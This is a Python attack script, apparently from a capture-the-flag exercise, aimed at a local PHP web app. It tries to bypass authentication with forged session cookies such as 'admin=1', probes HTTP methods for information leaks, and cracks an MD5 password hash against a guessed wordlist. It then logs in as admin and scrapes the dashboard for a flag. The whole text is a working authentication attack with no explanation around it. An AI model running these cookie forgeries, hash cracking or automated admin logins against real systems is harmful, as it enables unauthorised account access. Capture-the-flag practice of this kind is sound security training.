import requests
import re

cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}
base_url = "http://127.0.0.1:32892"

# Try following redirect
print("[*] Checking dashboard with redirect follow...")
resp = requests.get(f"{base_url}/dashboard.php", cookies=cookies, allow_redirects=True)
print(f"[*] Final URL: {resp.url}")
print(f"[*] Status: {resp.status_code}")
print(f"[*] Response:\n{resp.text[:1000]}")

# Try manipulating session/cookies
print("\n[*] Testing session manipulation...")

# Try common session values
session_tests = [
    {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol", "authenticated": "1"},
    {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol", "logged_in": "true"},
    {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol", "admin": "1"},
    {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol", "user": "admin"},
    {"PHPSESSID": "admin"},
    {"PHPSESSID": "authenticated"},
]

for test_cookies in session_tests:
    resp = requests.get(f"{base_url}/dashboard.php", cookies=test_cookies, allow_redirects=False)
    if resp.status_code != 302:
        print(f"[!] Different response with cookies: {test_cookies}")
        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:500]}")

# Check if there's any information disclosure in error pages
print("\n[*] Checking for information disclosure...")

# Try accessing with weird methods
methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD"]
for method in methods:
    try:
        resp = requests.request(method, f"{base_url}/dashboard.php", cookies=cookies, allow_redirects=False)
        if resp.status_code not in [302, 404, 405]:
            print(f"[*] {method} /dashboard.php -> {resp.status_code}")
            if resp.text:
                print(f"    Response: {resp.text[:300]}")
    except:
        pass

# Check if there are any hints in the hash itself
print("\n[*] Final attempt - checking if hash represents something specific...")

import hashlib

# Maybe the password is literally the word "hash" or "md5" or something meta
meta_passwords = [
    "7d39307ae824e70052c0aa16816a9b16",  # The hash itself
    "md5hash", "hashpassword", "password hash", "the password",
    "crackit", "hashcrack", "admin password",
    "change me", "changeme", "default password",
    "Password1!", "Adm!n123", "P@ssw0rd1", "Welcome1!",
    "PayBudd!3s", "P@yBudd!es", "paybudd!es", "payBuddies!"
]

for pwd in meta_passwords:
    if len(pwd) >= 8:
        h = hashlib.md5(pwd.encode()).hexdigest()
        if h == "7d39307ae824e70052c0aa16816a9b16":
            print(f"\n[+] *** PASSWORD FOUND! ***")
            print(f"[+] Password: {pwd}")
            print(f"[+] MD5: {h}")
            
            # Try to login
            headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
            }
            data = {"username": "admin", "password": pwd, "submit": "submit"}
            login_resp = requests.post(f"{base_url}/index.php", headers=headers, data=data, cookies=cookies)
            print(f"\n[*] Login response: {login_resp.text}")
            
            if "Success" in login_resp.text:
                session = requests.Session()
                session.cookies.update(cookies)
                session.cookies.update(login_resp.cookies)
                dash = session.get(f"{base_url}/dashboard.php")
                print(f"\n[*] Dashboard:\n{dash.text}")
                
                flags = re.findall(r'FLAG\{[^}]+\}', dash.text)
                if flags:
                    print(f"\n[!] FLAGS: {flags}")
            break

print("\n[*] Analysis complete")

